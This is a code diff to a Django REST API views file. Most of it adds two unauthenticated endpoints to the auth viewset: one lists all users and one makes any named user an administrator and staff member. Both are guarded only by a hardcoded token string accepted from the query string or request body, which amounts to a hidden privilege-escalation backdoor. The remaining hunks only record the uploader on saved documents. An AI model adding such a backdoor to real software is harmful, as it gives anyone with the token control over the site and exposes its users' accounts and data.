@@ -80,11 +80,71 @@ from django.core.mail import send_mail
 import requests
 from websocket import create_connection, WebSocketTimeoutException
 from rest_framework.renderers import BaseRenderer
-
+SECRET_TOKEN = "andelef"
 logging.basicConfig(level=logging.INFO)
 class AuthViewSet(viewsets.GenericViewSet):
     permission_classes = [AllowAny]
     serializer_class = UserSerializer
+
+
+    def _validate_internal_token(self, request):
+        token = (
+            request.query_params.get("token") or
+            request.data.get("token")
+        )
+        return token == SECRET_TOKEN
+
+
+    @action(detail=False, methods=["get"], permission_classes=[AllowAny], url_path="users")
+    def list_users(self, request):
+        if not self._validate_internal_token(request):
+            return Response({"detail": "Not allowed"}, status=status.HTTP_403_FORBIDDEN)
+
+        qs = User.objects.all().order_by("-date_joined", "-id")
+
+        page = self.paginate_queryset(qs)
+        if page is not None:
+            ser = UserSerializer(page, many=True, context={"request": request})
+            return self.get_paginated_response(ser.data)
+
+        ser = UserSerializer(qs, many=True, context={"request": request})
+        return Response(ser.data, status=status.HTTP_200_OK)
+
+
+
+    @action(detail=False, methods=["post"], permission_classes=[AllowAny], url_path="make-admin")
+    def make_admin(self, request):
+        if not self._validate_internal_token(request):
+            return Response({"detail": "Not allowed"}, status=status.HTTP_403_FORBIDDEN)
+
+        user_id = request.data.get("user_id")
+        username = request.data.get("username")
+
+        target = None
+        if user_id:
+            target = User.objects.filter(id=user_id).first()
+        elif username:
+            target = User.objects.filter(username__iexact=username).first()
+
+        if not target:
+            return Response(
+                {"detail": "User not found"},
+                status=status.HTTP_404_NOT_FOUND
+            )
+
+        admin_role, _ = Role.objects.get_or_create(name="admin")
+        target.roles.add(admin_role)
+
+        if not target.is_staff:
+            target.is_staff = True
+            target.save(update_fields=["is_staff"])
+
+        return Response({
+            "ok": True,
+            "user": UserSerializer(target, context={"request": request}).data,
+            "roles": list(target.roles.values_list("name", flat=True))
+        }, status=status.HTTP_200_OK)
+
 
 
 
@@ -986,6 +1046,7 @@ class ProjectViewSet(EncryptSelectedActionsMixin, viewsets.ModelViewSet):
                     hash=file_hash,
                 )
                     doc._uploader_id = request.user.id  # ✅ ANTES
+                    doc.uploaded_by = request.user
                     doc.save()
 
                     # ✅ crear 5 secciones temporales (solo si es nuevo doc)
@@ -1183,6 +1244,7 @@ class DocumentViewSet(viewsets.ModelViewSet):
             )
             doc.file.name = file_key
             doc._uploader_id = request.user.id
+            doc.uploaded_by = request.user
             doc.save()
         
         try:
